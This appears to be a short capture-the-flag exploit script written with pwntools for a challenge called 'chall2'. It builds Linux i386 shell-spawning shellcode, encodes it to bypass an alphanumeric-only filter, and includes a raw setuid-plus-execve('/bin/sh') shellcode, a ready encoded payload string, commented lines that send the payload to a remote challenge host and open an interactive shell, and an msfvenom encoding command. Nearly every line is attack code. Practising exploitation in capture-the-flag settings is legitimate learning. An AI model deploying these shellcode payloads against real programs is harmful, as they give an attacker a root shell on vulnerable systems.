from pwn import *
context(arch = 'i386', os = 'linux')
# r = remote('155.69.144.206', 22805)
cmd = asm(shellcraft.sh())
# encoder.re_alphanumeric = r'[^A-Z0-9]'
encoded = pwnlib.encoders.encode(cmd, expr=r'[^A-Z0-9]')
print(cmd)
print(encoded)
# e = ELF("./chall2")
# r = process(e.path)
test="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"+ \
"\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"+ \
"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"+ \
"\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"+ \
"\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42" 
print(disasm(test.encode()))
ans="ZJJJJCCCCCCCRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQXIZWM180DK58VO2S3XC03X6O52BIRNLIM3XMMPAA"
print(ans)
print(disasm(ans.encode()))
# r.send(test)
# r.interactive()
# msfvenom -p linux/x86/exec -e x86/alpha_upper BufferRegister=ESP -o ~/Desktop/NTU-CTF/attachments_2/test.txt